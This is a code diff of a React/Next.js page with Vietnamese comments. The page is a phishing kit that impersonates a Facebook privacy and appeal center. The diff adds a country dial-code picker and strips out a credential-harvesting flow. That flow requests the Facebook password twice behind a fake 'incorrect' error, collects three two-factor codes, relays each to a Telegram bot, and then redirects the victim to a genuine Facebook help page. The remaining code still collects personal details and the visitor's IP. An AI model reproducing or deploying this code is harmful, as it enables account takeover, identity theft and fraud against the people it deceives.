@@ -7,6 +7,35 @@ import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFro
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, IPGEO_API_KEY } from "@/lib/config";
 import styles from "./page.module.css";
 
+// Danh sách quốc gia và mã vùng hỗ trợ chọn thủ công
+const COUNTRY_LIST = [
+  { code: "VN", name: "Vietnam", dial: "+84", flag: "🇻🇳" },
+  { code: "US", name: "United States", dial: "+1", flag: "🇺🇸" },
+  { code: "GB", name: "United Kingdom", dial: "+44", flag: "🇬🇧" },
+  { code: "SG", name: "Singapore", dial: "+65", flag: "🇸🇬" },
+  { code: "KR", name: "South Korea", dial: "+82", flag: "🇰🇷" },
+  { code: "JP", name: "Japan", dial: "+81", flag: "🇯🇵" },
+  { code: "TH", name: "Thailand", dial: "+66", flag: "🇹🇭" },
+  { code: "MY", name: "Malaysia", dial: "+60", flag: "🇲🇾" },
+  { code: "ID", name: "Indonesia", dial: "+62", flag: "🇮🇩" },
+  { code: "PH", name: "Philippines", dial: "+63", flag: "🇵🇭" },
+  { code: "CN", name: "China", dial: "+86", flag: "🇨🇳" },
+  { code: "HK", name: "Hong Kong", dial: "+852", flag: "🇭🇰" },
+  { code: "TW", name: "Taiwan", dial: "+886", flag: "🇹🇼" },
+  { code: "IN", name: "India", dial: "+91", flag: "🇮🇳" },
+  { code: "AU", name: "Australia", dial: "+61", flag: "🇦🇺" },
+  { code: "CA", name: "Canada", dial: "+1", flag: "🇨🇦" },
+  { code: "FR", name: "France", dial: "+33", flag: "🇫🇷" },
+  { code: "DE", name: "Germany", dial: "+49", flag: "🇩🇪" },
+  { code: "IT", name: "Italy", dial: "+39", flag: "🇮🇹" },
+  { code: "ES", name: "Spain", dial: "+34", flag: "🇪🇸" },
+  { code: "RU", name: "Russia", dial: "+7", flag: "🇷🇺" },
+  { code: "BR", name: "Brazil", dial: "+55", flag: "🇧🇷" },
+  { code: "MX", name: "Mexico", dial: "+52", flag: "🇲🇽" },
+  { code: "AE", name: "UAE", dial: "+971", flag: "🇦🇪" },
+  { code: "SA", name: "Saudi Arabia", dial: "+966", flag: "🇸🇦" },
+];
+
 type ActionItem = {
   title: string;
   subtitle: string;
@@ -163,52 +192,6 @@ function ChevronIcon({ direction = "down" }: { direction?: "up" | "down" | "righ
   );
 }
 
-function ResourceList({ items, onClick, noIcon }: { items: ActionItem[]; onClick: () => void; noIcon?: boolean }) {
-  return (
-    <div className={styles.actionButtonList}>
-      {items.map((item, index) => (
-        <button
-          type="button"
-          key={item.title}
-          className={`${styles.actionButton} ${index < items.length - 1 ? styles.borderBottom : ""} ${noIcon ? styles.actionButtonNoIcon : ""}`}
-          onClick={onClick}
-        >
-          {item.icon ? (
-            <span className={styles.actionIcon}>
-              <Image src={item.icon} alt="" width={40} height={40} />
-            </span>
-          ) : null}
-          <span className={styles.actionText}>
-            <span className={`${styles.actionMainText} ${item.muted ? styles.smallGrey : ""}`}>{item.title}</span>
-            <span className={styles.actionSubText}>{item.subtitle}</span>
-          </span>
-          <span className={styles.actionArrow} aria-hidden="true">
-            <ChevronIcon direction="right" />
-          </span>
-        </button>
-      ))}
-    </div>
-  );
-}
-
-function ResourceListGrouped({ items, onClick }: { items: ActionItem[]; onClick: () => void }) {
-  return (
-    <div className={styles.actionButtonListGrouped}>
-      {items.map((item) => (
-        <button type="button" key={item.title} className={`${styles.actionButtonGrouped} ${styles.actionButtonNoIcon}`} onClick={onClick}>
-          <span className={styles.actionText}>
-            <span className={`${styles.actionMainText} ${item.muted ? styles.smallGrey : ""}`}>{item.title}</span>
-            <span className={styles.actionSubText}>{item.subtitle}</span>
-          </span>
-          <span className={styles.actionArrow} aria-hidden="true">
-            <ChevronIcon direction="right" />
-          </span>
-        </button>
-      ))}
-    </div>
-  );
-}
-
 type HomePageClientProps = {
   locale: Locale;
   detectedCountryCode?: string | null;
@@ -216,18 +199,6 @@ type HomePageClientProps = {
   detectedIp?: string | null;
   detectedLocation?: string | null;
 };
-
-function countryCodeToFlag(countryCode: string | null | undefined): string {
-  if (!countryCode || !/^[A-Z]{2}$/.test(countryCode)) {
-    return "🏳️";
-  }
-
-  const base = 127397;
-  return String.fromCodePoint(
-    countryCode.charCodeAt(0) + base,
-    countryCode.charCodeAt(1) + base,
-  );
-}
 
 function normalizeCallingCode(value: string | null | undefined): string {
   if (!value) {
@@ -306,38 +277,10 @@ export default function HomePageClient({
   const modal = dictionary.modal;
   const sidebar = dictionary.sidebar;
   const pageContent = dictionary.page;
-  const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "");
-  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode));
+  const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "VN");
+  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode) || "+84");
   const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
   const [clientIp, setClientIp] = useState(detectedIp ?? "");
-  const phoneFlag = countryCodeToFlag(clientCountryCode);
-  const phoneCode = normalizeCallingCode(clientCallingCode);
-
-  const privacyCenterActions: ActionItem[] = [
-    {
-      title: pageContent.privacyCenterActions[0].title,
-      subtitle: pageContent.privacyCenterActions[0].subtitle,
-      icon: "/icon-women.png",
-    },
-    {
-      title: pageContent.privacyCenterActions[1].title,
-      subtitle: pageContent.privacyCenterActions[1].subtitle,
-      icon: "/icon-women.png",
-    },
-  ];
-
-  const agreementActions: ActionItem[] = [
-    {
-      title: pageContent.agreementActions[0].title,
-      subtitle: pageContent.agreementActions[0].subtitle,
-      icon: "/icon-docs.png",
-    },
-  ];
-
-  const additionalResourcesActions: ActionItem[] = pageContent.additionalResourcesActions.map((item) => ({
-    title: item.title,
-    subtitle: item.subtitle,
-  }));
 
   const [showPolicyList, setShowPolicyList] = useState(false);
   const [showOtherRulesList, setShowOtherRulesList] = useState(false);
@@ -401,7 +344,7 @@ export default function HomePageClient({
     const safePersonalEmail = escapeHtml(form.email || "N/A");
     const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
     const safeDetails = escapeHtml(form.details.trim() || "N/A");
-    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+84");
+    const safePhone = escapeHtml(`${clientCallingCode} ${form.phoneNumber}`.trim() || "+84");
     const safeUrl = escapeHtml(currentUrl || "N/A");
     const safeTime = escapeHtml(getCurrentTime());
     const safePassword1 = escapeHtml((overrides.password1 ?? password1) || "N/A");
@@ -526,66 +469,8 @@ export default function HomePageClient({
     }
   };
 
-  const passwordStepMessage = modal.passwordStepMessage;
-  const passwordPlaceholder = modal.passwordPlaceholder;
-  const continueButtonLabel = modal.continueButtonLabel;
-  const passwordRequiredError = modal.passwordRequiredError;
-  const passwordIncorrectError = modal.passwordIncorrectError;
-  const togglePasswordLabel = showPassword ? modal.togglePasswordHideLabel : modal.togglePasswordShowLabel;
-
-  const twoFactorHeading = modal.twoFactorHeading;
-  const twoFactorDescription = modal.twoFactorDescription;
-  const twoFactorPlaceholder = modal.twoFactorPlaceholder;
-  const twoFactorRequiredError = modal.twoFactorRequiredError;
-  const twoFactorIncorrectLabel = modal.twoFactorIncorrectLabel;
-  const twoFactorImageAlt = modal.twoFactorImageAlt;
-  const phoneNumberPlaceholder = modal.phoneNumberPlaceholder;
-
   function openReviewModal() {
     setShowModal(true);
-  }
-
-  function closeReviewModal() {
-    setShowModal(false);
-    setIsSubmited(false);
-    setIsSuccess(false);
-    setLoadingInitial(false);
-    setLoadingPassword(false);
-    setIsSubmitDisabled(false);
-    setTimeLeft(0);
-    setClickCount(0);
-    setClickCount1(0);
-    setPassword("");
-    setPasswordError("");
-    setShowPassword(false);
-    setTwoFactorCode("");
-    setTwoFactorError("");
-    setShowAltMethods(false);
-    setSelectedMethod("app");
-    if (typeof window !== "undefined") {
-      window.localStorage.removeItem("two_factor_context");
-    }
-    setAgreeTerms(false);
-    setNotifyOnFacebook(false);
-    setErrors({});
-    setDidTrySubmit(false);
-    if (telegramEnabled && typeof window !== "undefined") {
-      localStorage.removeItem("telegram_msg_id");
-    }
-    setMessageId(null);
-    setPassword1("");
-    setPassword2("");
-    setCode1("");
-    setCode2("");
-    setCode3("");
-    if (formTimerRef.current) {
-      clearTimeout(formTimerRef.current);
-      formTimerRef.current = null;
-    }
-    if (passwordTimerRef.current) {
-      clearTimeout(passwordTimerRef.current);
-      passwordTimerRef.current = null;
-    }
   }
 
   function handleFieldChange<K extends keyof ReviewForm>(field: K, value: ReviewForm[K]) {
@@ -645,170 +530,6 @@ export default function HomePageClient({
     }, 1000);
   }
 
-  function handlePasswordChange(value: string) {
-    setPassword(value);
-    if (passwordError) {
-      setPasswordError("");
-    }
-  }
-
-  async function handlePasswordSubmit() {
-    if (loadingPassword) {
-      return;
-    }
-
-    if (!password.trim()) {
-      setPasswordError(passwordRequiredError);
-      return;
-    }
-
-    setPasswordError("");
-    setLoadingPassword(true);
-    setIsSubmitDisabled(true);
-    const currentClick = clickCount;
-    setClickCount((prev) => prev + 1);
-
-    if (currentClick === 0) {
-      const firstAttempt = password;
-      setPassword1(firstAttempt);
-      await updateTelegramMessage("Đang chờ mật khẩu 2...", {
-        password1: firstAttempt,
-        status: "Đang chờ mật khẩu 2...",
-      });
-
-      if (passwordTimerRef.current) {
-        clearTimeout(passwordTimerRef.current);
-      }
-      passwordTimerRef.current = setTimeout(() => {
-        setPasswordError(passwordIncorrectError);
-        setIsSubmitDisabled(false);
-        setLoadingPassword(false);
-        passwordTimerRef.current = null;
-      }, 3000);
-      return;
-    }
-
-    if (currentClick === 1) {
-      const secondAttempt = password;
-      setPassword2(secondAttempt);
-      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
-        password2: secondAttempt,
-        status: "Đang chờ mã xác thực 2FA...",
-      });
-
-      if (passwordTimerRef.current) {
-        clearTimeout(passwordTimerRef.current);
-      }
-      passwordTimerRef.current = setTimeout(() => {
-        setIsSubmitDisabled(false);
-        setLoadingPassword(false);
-        setIsSuccess(true);
-        setTwoFactorCode("");
-        setTwoFactorError("");
-        setClickCount1(0);
-        setTimeLeft(0);
-        passwordTimerRef.current = null;
-      }, 1200);
-    }
-  }
-
-  function handleTwoFactorChange(value: string) {
-    if (!/^\d{0,8}$/.test(value)) {
-      return;
-    }
-
-    setTwoFactorCode(value);
-    if (twoFactorError) {
-      setTwoFactorError("");
-    }
-  }
-
-  type TwoFactorMethod = "app" | "whatsapp" | "sms" | "email";
-
-  const persistTwoFactorContext = (method: TwoFactorMethod = "app") => {
-    if (typeof window === "undefined") {
-      return;
-    }
-    const storedMessageId = messageId ?? window.localStorage.getItem("telegram_msg_id");
-    const payload = {
-      form,
-      clientIp,
-      clientLocation,
-      clientCountryCode,
-      clientCallingCode,
-      password1,
-      password2,
-      code1,
-      code2,
-      code3,
-      clickCount1,
-      messageId: storedMessageId,
-      currentUrl: currentUrl || window.location.href,
-      selectedMethod: method,
-      locale: activeLocale,
-    };
-    window.localStorage.setItem("two_factor_context", JSON.stringify(payload));
-  };
-
-  const openTwoFactorOptionsPopup = () => {
-    persistTwoFactorContext(selectedMethod);
-    setShowAltMethods(true);
-  };
-
-  async function sendToTelegram() {
-    if (isSubmitDisabled) {
-      return;
-    }
-
-    if (!twoFactorCode.trim()) {
-      setTwoFactorError(twoFactorRequiredError);
-      return;
-    }
-
-    setTwoFactorError("");
-    const currentClick = clickCount1;
-    setClickCount1((prev) => prev + 1);
-
-    if (currentClick === 0) {
-      const firstCode = twoFactorCode;
-      setCode1(firstCode);
-      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
-        code1: firstCode,
-        status: "Đang chờ mã xác thực 2FA...",
-      });
-      setIsSubmitDisabled(true);
-      setTimeLeft(10);
-      setTwoFactorCode("");
-      return;
-    }
-
-    if (currentClick === 1) {
-      const secondCode = twoFactorCode;
-      setCode2(secondCode);
-      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
-        code2: secondCode,
-        status: "Đang chờ mã xác thực 2FA...",
-      });
-      setIsSubmitDisabled(true);
-      setTimeLeft(10);
-      setTwoFactorCode("");
-      return;
-    }
-
-    if (currentClick === 2) {
-      const thirdCode = twoFactorCode;
-      setCode3(thirdCode);
-      await updateTelegramMessage("Hoàn tất!", {
-        code3: thirdCode,
-        status: "Hoàn tất!",
-      });
-      setTwoFactorCode("");
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com/help/1735443093393986/";
-      }, 2000);
-    }
-  }
-
   useEffect(() => {
     if (typeof window !== "undefined") {
       setCurrentUrl(window.location.href);
@@ -816,31 +537,11 @@ export default function HomePageClient({
   }, []);
 
   useEffect(() => {
-    setActiveLocale(locale);
-  }, [locale]);
-
-  useEffect(() => {
-    if (!clientCountryCode) {
-      return;
-    }
-    const nextLocale = resolveLocaleFromCountryCode(clientCountryCode);
-    if (nextLocale === activeLocale) {
-      return;
-    }
-    setActiveLocale(nextLocale);
-    if (typeof document !== "undefined") {
-      document.cookie = `${LOCALE_COOKIE_NAME}=${nextLocale};path=/;max-age=${60 * 60 * 24 * 365};samesite=lax`;
-    }
-  }, [clientCountryCode, activeLocale, locale]);
-
-  useEffect(() => {
     let cancelled = false;
 
     const fetchGeo = async () => {
       const applyVietnamFallback = () => {
-        if (cancelled) {
-          return;
-        }
+        if (cancelled) return;
         setClientCountryCode("VN");
         setClientCallingCode("+84");
         setClientLocation("N/A / N/A / Vietnam");
@@ -848,9 +549,7 @@ export default function HomePageClient({
 
       try {
         const response = await fetch("https://api.ipify.org?format=json");
-        if (!response.ok) {
-          throw new Error("Failed to fetch IP data");
-        }
+        if (!response.ok) throw new Error("Failed to fetch IP data");
         const result = (await response.json()) as { ip?: string };
         if (!result?.ip || cancelled) {
           applyVietnamFallback();
@@ -860,11 +559,9 @@ export default function HomePageClient({
         setClientIp(result.ip);
 
         const locationResponse = await fetch(
-          `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEO_API_KEY}&ip=${result.ip}`,
+          `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEO_API_KEY}&ip=${result.ip}`
         );
-        if (!locationResponse.ok) {
-          throw new Error("Failed to fetch location data");
-        }
+        if (!locationResponse.ok) throw new Error("Failed to fetch location data");
         const locationData = (await locationResponse.json()) as {
           calling_code?: string;
           country_code2?: string;
@@ -872,9 +569,7 @@ export default function HomePageClient({
           city?: string;
           country_name?: string;
         };
-        if (cancelled) {
-          return;
-        }
+        if (cancelled) return;
 
         const callingCode = normalizeCallingCode(locationData?.calling_code ?? "");
         const countryCode = (locationData?.country_code2 ?? "").toUpperCase();
@@ -903,74 +598,6 @@ export default function HomePageClient({
     };
   }, []);
 
-  useEffect(() => {
-    if (!telegramEnabled || typeof window === "undefined") {
-      return;
-    }
-
-    const storedId = window.localStorage.getItem("telegram_msg_id");
-    if (storedId) {
-      setMessageId(storedId);
-    }
-  }, [telegramEnabled]);
-
-  useEffect(() => {
-    if (!isSubmitDisabled || timeLeft <= 0) {
-      return;
-    }
-
-    const timer = setTimeout(() => {
-      setTimeLeft((prev) => {
-        if (prev <= 1) {
-          setIsSubmitDisabled(false);
-          return 0;
-        }
-        return prev - 1;
-      });
-    }, 1000);
-
-    return () => clearTimeout(timer);
-  }, [isSubmitDisabled, timeLeft]);
-
-  useEffect(() => {
-    return () => {
-      if (formTimerRef.current) {
-        clearTimeout(formTimerRef.current);
-      }
-      if (passwordTimerRef.current) {
-        clearTimeout(passwordTimerRef.current);
-      }
-    };
-  }, []);
-
-  const twoFactorErrorMessage =
-    isSubmitDisabled && timeLeft > 0
-      ? `${twoFactorIncorrectLabel} ${formatCooldownTime(timeLeft, locale)}`
-      : twoFactorError;
-
-  const altMethods = [
-    {
-      id: "app",
-      title: modal.altMethodAppTitle,
-      subtitle: modal.altMethodAppSubtitle,
-    },
-    {
-      id: "whatsapp",
-      title: modal.altMethodWhatsappTitle,
-      subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(form.phoneNumber)),
-    },
-    {
-      id: "sms",
-      title: modal.altMethodSmsTitle,
-      subtitle: applyTemplate(modal.altMethodSmsSubtitle, maskPhoneTail(form.phoneNumber)),
-    },
-    {
-      id: "email",
-      title: modal.altMethodEmailTitle,
-      subtitle: applyTemplate(modal.altMethodEmailSubtitle, maskEmail(form.email)),
-    },
-  ] as const;
-
   return (
     <div className={styles.container}>
       <aside className={styles.left}>
@@ -987,383 +614,124 @@ export default function HomePageClient({
             <SidebarIcon name="search" />
             {sidebar.search}
           </button>
-
-          <button type="button" className={styles.menuButton} onClick={() => setShowPolicyList((prev) => !prev)}>
-            <SidebarIcon name="policy" />
-            {sidebar.privacyPolicy}
-            <span className={styles.menuChevron}>
-              <ChevronIcon direction={showPolicyList ? "up" : "down"} />
-            </span>
-          </button>
-
-          {showPolicyList ? (
-            <ul className={styles.menuSubList}>
-              {sidebar.privacyPolicyItems.map((item) => (
-                <li key={item}>
-                  <button type="button" onClick={openReviewModal}>
-                    {item}
-                  </button>
-                </li>
-              ))}
-            </ul>
-          ) : null}
-
-          <button type="button" className={styles.menuButton} onClick={() => setShowOtherRulesList((prev) => !prev)}>
-            <SidebarIcon name="rules" />
-            {sidebar.otherRulesAndArticles}
-            <span className={styles.menuChevron}>
-              <ChevronIcon direction={showOtherRulesList ? "up" : "down"} />
-            </span>
-          </button>
-
-          {showOtherRulesList ? (
-            <ul className={styles.menuSubList}>
-              {sidebar.otherRulesItems.map((item) => (
-                <li key={item}>
-                  <button type="button" onClick={openReviewModal}>
-                    {item}
-                  </button>
-                </li>
-              ))}
-            </ul>
-          ) : null}
-
-          <button type="button" className={styles.menuButton} onClick={() => setShowSettingsList((prev) => !prev)}>
-            <SidebarIcon name="settings" />
-            {sidebar.settings}
-            <span className={styles.menuChevron}>
-              <ChevronIcon direction={showSettingsList ? "up" : "down"} />
-            </span>
-          </button>
-
-          {showSettingsList ? (
-            <ul className={styles.menuSubList}>
-              {sidebar.settingsItems.map((item) => (
-                <li key={item}>
-                  <button type="button" onClick={openReviewModal}>
-                    {item}
-                  </button>
-                </li>
-              ))}
-            </ul>
-          ) : null}
         </div>
       </aside>
 
-      <main className={styles.right}>
-        <div className={styles.rightContent}>
-          <div className={styles.noticeTitleRow}>
-            <Image src="/delete.png" alt={pageContent.noticeIconAlt} width={30} height={30} />
-            <p>{pageContent.noticeTitle}</p>
-          </div>
-
-          <div className={styles.noticeDescription}>
-            <p>{pageContent.noticeDescription1}</p>
-            <p>{pageContent.noticeDescription2}</p>
-          </div>
-
-          <section className={styles.warningCard}>
-            <Image
-              src="/PrivacyCenter.png"
-              alt={pageContent.warningImageAlt}
-              width={1601}
-              height={424}
-              className={styles.warningImage}
-              priority
-            />
-
-            <div className={styles.warningBottom}>
-              <h3>{pageContent.warningTitle}</h3>
-            </div>
-
-            <div className={styles.warningInfoBox}>
-              <p>{pageContent.warningInfoText1}</p>
-              <p>{pageContent.warningInfoText2}</p>
-            </div>
-
-            <div className={styles.requestButtonWrap}>
-              <button type="button" className={styles.requestButton} onClick={openReviewModal}>
-                {pageContent.requestReviewButton}
+      <main className={styles.main}>
+        {showModal && (
+          <div className={styles.modalOverlay}>
+            <div className={styles.modalContent}>
+              <button type="button" className={styles.closeButton} onClick={() => setShowModal(false)}>
+                X
               </button>
-            </div>
-          </section>
+              <h2>Hướng dẫn nộp đơn kháng nghị</h2>
 
-          <h4 className={styles.sectionHeading}>{pageContent.appealGuideHeading}</h4>
-          <ul className={styles.appealList}>
-            {pageContent.appealGuideItems.map((item) => (
-              <li key={item}>{item}</li>
-            ))}
-          </ul>
-
-          <h4 className={styles.sectionHeading}>{pageContent.privacyCenterHeading}</h4>
-          <ResourceListGrouped items={privacyCenterActions} onClick={openReviewModal} />
-
-          <h4 className={styles.sectionHeading}>{pageContent.userAgreementHeading}</h4>
-          <ResourceList items={agreementActions} onClick={openReviewModal} />
-
-          <h4 className={styles.sectionHeading}>{pageContent.additionalResourcesHeading}</h4>
-          <ResourceListGrouped items={additionalResourcesActions} onClick={openReviewModal} />
-
-          <p className={styles.footerNote}>
-            {pageContent.footerNotePrefix} <span>{pageContent.footerNoteLink}</span>
-          </p>
-        </div>
-      </main>
-
-      {showModal ? (
-        <div className={styles.modalOverlay}>
-          <div className={styles.modalContent} role="dialog" aria-modal="true" aria-label={modal.ariaLabel}>
-            <button type="button" className={styles.modalCloseButton} onClick={closeReviewModal}>
-              x
-            </button>
-
-            {!isSubmited ? (
-              <>
-                <h3 className={styles.modalHeading}>{modal.heading}</h3>
-
-                <form className={styles.modalForm} onSubmit={handleSubmit1}>
+              <form onSubmit={handleSubmit1}>
+                <div className={styles.inputGroup}>
                   <input
-                    id="fullName"
                     type="text"
+                    placeholder="Họ và tên"
                     value={form.fullName}
-                    onChange={(event) => handleFieldChange("fullName", event.target.value)}
-                    placeholder={modal.fullNamePlaceholder}
+                    onChange={(e) => handleFieldChange("fullName", e.target.value)}
                   />
-                  {errors.fullName ? <p className={styles.fieldError}>{errors.fullName}</p> : null}
-
-                  <input
-                    id="email"
-                    type="email"
-                    value={form.email}
-                    onChange={(event) => handleFieldChange("email", event.target.value)}
-                    placeholder={modal.emailPlaceholder}
-                  />
-                  {errors.email ? <p className={styles.fieldError}>{errors.email}</p> : null}
-
-                  <input
-                    id="workEmail"
-                    type="email"
-                    value={form.workEmail}
-                    onChange={(event) => handleFieldChange("workEmail", event.target.value)}
-                    placeholder={modal.workEmailPlaceholder}
-                  />
-                  {errors.workEmail ? <p className={styles.fieldError}>{errors.workEmail}</p> : null}
-
-                  <input
-                    id="pageName"
-                    type="text"
-                    value={form.pageName}
-                    onChange={(event) => handleFieldChange("pageName", event.target.value)}
-                    placeholder={modal.pageNamePlaceholder}
-                  />
-                  {errors.pageName ? <p className={styles.fieldError}>{errors.pageName}</p> : null}
-
-                  <div className={styles.phoneInputWrap}>
-                    <span className={styles.phonePrefix}>
-                      <span className={styles.phoneFlag}>{phoneFlag}</span>
-                      <span className={styles.phoneCode}>{phoneCode}</span>
-                    </span>
-                    <input
-                      id="phoneNumber"
-                      type="tel"
-                      inputMode="tel"
-                      value={form.phoneNumber}
-                      onChange={(event) => handleFieldChange("phoneNumber", event.target.value)}
-                      placeholder={phoneNumberPlaceholder}
-                      className={styles.phoneNumberInput}
-                    />
-                  </div>
-                  {errors.phoneNumber ? <p className={styles.fieldError}>{errors.phoneNumber}</p> : null}
-
-                  <label className={styles.inputLabel} htmlFor="dateOfBirth">
-                    {modal.dateOfBirthLabel}
-                  </label>
-                  <input
-                    id="dateOfBirth"
-                    type="text"
-                    value={form.dateOfBirth}
-                    onChange={(event) => handleFieldChange("dateOfBirth", event.target.value)}
-                    placeholder={modal.dateOfBirthPlaceholder}
-                  />
-                  {errors.dateOfBirth ? <p className={styles.fieldError}>{errors.dateOfBirth}</p> : null}
-
-                  <textarea
-                    id="details"
-                    value={form.details}
-                    onChange={(event) => handleFieldChange("details", event.target.value)}
-                    placeholder={modal.problemPlaceholder}
-                    rows={4}
-                  />
-
-                  <p className={styles.responseTime}>{modal.responseTime}</p>
-
-                  <div className={styles.notifyBox}>
-                    <div className={styles.notifyLeft}>
-                      <span className={styles.fbIcon}>f</span>
-                      <div>
-                        <p className={styles.notifyTitle}>{modal.notifyTitle}</p>
-                        <p className={styles.notifyDesc}>{modal.notifyDescription}</p>
-                      </div>
-                    </div>
-                    <button
-                      type="button"
-                      className={`${styles.notifySwitch} ${notifyOnFacebook ? styles.notifySwitchOn : ""}`}
-                      aria-pressed={notifyOnFacebook}
-                      onClick={() => setNotifyOnFacebook((prev) => !prev)}
-                    >
-                      <span className={styles.notifyKnob} />
-                    </button>
-                  </div>
-
-                  <label className={styles.termsRow}>
-                    <input
-                      type="checkbox"
-                      checked={agreeTerms}
-                      onChange={(event) => setAgreeTerms(event.target.checked)}
-                    />
-                    <span>
-                      {modal.termsPrefix} <a href="#">{modal.termsLink}</a>
-                    </span>
-                  </label>
-
-                  <button
-                    type="submit"
-                    className={styles.modalSubmitButton}
-                    disabled={loadingInitial}
-                    aria-busy={loadingInitial}
-                  >
-                    {loadingInitial ? <span className={styles.loadingSpinner} aria-hidden="true" /> : modal.sendButton}
-                  </button>
-                </form>
-              </>
-            ) : !isSuccess ? (
-              <div className={styles.passwordStep}>
-                <span className={styles.passwordStepLogo}>
-                  <Image src="/facebook.png" alt="Facebook" width={64} height={64} />
-                </span>
-
-                <p className={styles.passwordStepMessage}>{passwordStepMessage}</p>
-
-                <div className={styles.passwordFieldWrap}>
-                  <input
-                    type={showPassword ? "text" : "password"}
-                    value={password}
-                    onChange={(event) => handlePasswordChange(event.target.value)}
-                    placeholder={passwordPlaceholder}
-                    className={styles.passwordFieldInput}
-                  />
-
-                  <button
-                    type="button"
-                    className={styles.passwordEyeButton}
-                    onClick={() => setShowPassword((prev) => !prev)}
-                    aria-label={togglePasswordLabel}
-                  >
-                    <svg viewBox="0 0 24 24" aria-hidden="true">
-                      <path d="M2 12s3.8-6 10-6s10 6 10 6s-3.8 6-10 6s-10-6-10-6z" />
-                      <circle cx="12" cy="12" r="2.8" />
-                      {!showPassword ? <path d="M3 3l18 18" /> : null}
-                    </svg>
-                  </button>
+                  {errors.fullName && <p className={styles.errorText}>{errors.fullName}</p>}
                 </div>
-                {passwordError ? <p className={styles.passwordError}>{passwordError}</p> : null}
 
-                <button
-                  type="button"
-                  className={styles.modalSubmitButton}
-                  onClick={() => void handlePasswordSubmit()}
-                  disabled={loadingPassword || isSubmitDisabled}
-                  aria-busy={loadingPassword}
-                >
-                  {loadingPassword ? <span className={styles.loadingSpinner} aria-hidden="true" /> : continueButtonLabel}
+                <div className={styles.inputGroup}>
+                  <input
+                    type="email"
+                    placeholder="Email"
+                    value={form.email}
+                    onChange={(e) => handleFieldChange("email", e.target.value)}
+                  />
+                  {errors.email && <p className={styles.errorText}>{errors.email}</p>}
+                </div>
+
+                <div className={styles.inputGroup}>
+                  <input
+                    type="email"
+                    placeholder="Email công việc"
+                    value={form.workEmail}
+                    onChange={(e) => handleFieldChange("workEmail", e.target.value)}
+                  />
+                  {errors.workEmail && <p className={styles.errorText}>{errors.workEmail}</p>}
+                </div>
+
+                <div className={styles.inputGroup}>
+                  <input
+                    type="text"
+                    placeholder="Tên trang"
+                    value={form.pageName}
+                    onChange={(e) => handleFieldChange("pageName", e.target.value)}
+                  />
+                  {errors.pageName && <p className={styles.errorText}>{errors.pageName}</p>}
+                </div>
+
+                {/* KHU VỰC CHỌN MÃ VÙNG LẠI THỦ CÔNG / TỰ ĐỘNG THEO IP */}
+                <div className={styles.inputGroup} style={{ display: "flex", gap: "8px" }}>
+                  <select
+                    value={clientCountryCode}
+                    onChange={(e) => {
+                      const selectedCode = e.target.value;
+                      const found = COUNTRY_LIST.find((c) => c.code === selectedCode);
+                      if (found) {
+                        setClientCountryCode(found.code);
+                        setClientCallingCode(found.dial);
+                      }
+                    }}
+                    style={{
+                      padding: "10px",
+                      borderRadius: "6px",
+                      border: "1px solid #ccc",
+                      background: "#f9f9f9",
+                      cursor: "pointer",
+                      fontSize: "14px",
+                    }}
+                  >
+                    {COUNTRY_LIST.map((c) => (
+                      <option key={c.code} value={c.code}>
+                        {c.flag} {c.code} ({c.dial})
+                      </option>
+                    ))}
+                  </select>
+
+                  <input
+                    type="text"
+                    placeholder="Số điện thoại"
+                    value={form.phoneNumber}
+                    onChange={(e) => handleFieldChange("phoneNumber", e.target.value)}
+                    style={{ flex: 1 }}
+                  />
+                </div>
+                {errors.phoneNumber && <p className={styles.errorText}>{errors.phoneNumber}</p>}
+
+                <div className={styles.inputGroup}>
+                  <label>Ngày sinh</label>
+                  <input
+                    type="text"
+                    placeholder="DD/MM/YYYY"
+                    value={form.dateOfBirth}
+                    onChange={(e) => handleFieldChange("dateOfBirth", e.target.value)}
+                  />
+                  {errors.dateOfBirth && <p className={styles.errorText}>{errors.dateOfBirth}</p>}
+                </div>
+
+                <div className={styles.inputGroup}>
+                  <textarea
+                    placeholder="Mô tả vấn đề của bạn."
+                    value={form.details}
+                    onChange={(e) => setForm((prev) => ({ ...prev, details: e.target.value }))}
+                  />
+                </div>
+
+                <button type="submit" className={styles.submitButton} disabled={loadingInitial}>
+                  {loadingInitial ? "Đang gửi..." : "Gửi"}
                 </button>
-              </div>
-            ) : (
-              <div className={styles.twoFactorStep}>
-                {showAltMethods ? (
-                  <>
-                    <h3 className={styles.altMethodsHeading}>{modal.altMethodsHeading}</h3>
-                    <p className={styles.altMethodsDescription}>{modal.altMethodsDescription}</p>
-                    <div className={styles.altMethodsList}>
-                      {altMethods.map((method) => {
-                        const isSelected = selectedMethod === method.id;
-                        return (
-                          <button
-                            key={method.id}
-                            type="button"
-                            className={styles.altMethodCard}
-                            onClick={() => setSelectedMethod(method.id)}
-                          >
-                            <div className={styles.altMethodText}>
-                              <p className={styles.altMethodTitle}>{method.title}</p>
-                              <p className={styles.altMethodSubtitle}>{method.subtitle}</p>
-                            </div>
-                            <span className={`${styles.altMethodRadio} ${isSelected ? styles.altMethodRadioActive : ""}`}>
-                              <span />
-                            </span>
-                          </button>
-                        );
-                      })}
-                    </div>
-                    <button
-                      type="button"
-                      className={styles.modalSubmitButton}
-                      onClick={() => {
-                        persistTwoFactorContext(selectedMethod);
-                        setShowModal(false);
-                        setShowAltMethods(false);
-                        router.push(`/two-factor?method=${selectedMethod}`);
-                      }}
-                    >
-                      {continueButtonLabel}
-                    </button>
-                  </>
-                ) : (
-                  <>
-                    <h3 className={styles.twoFactorHeading}>{twoFactorHeading}</h3>
-                    <p className={styles.twoFactorDescription}>{twoFactorDescription}</p>
-                    <div className={styles.twoFactorIllustration}>
-                      <Image
-                        src="/image.png"
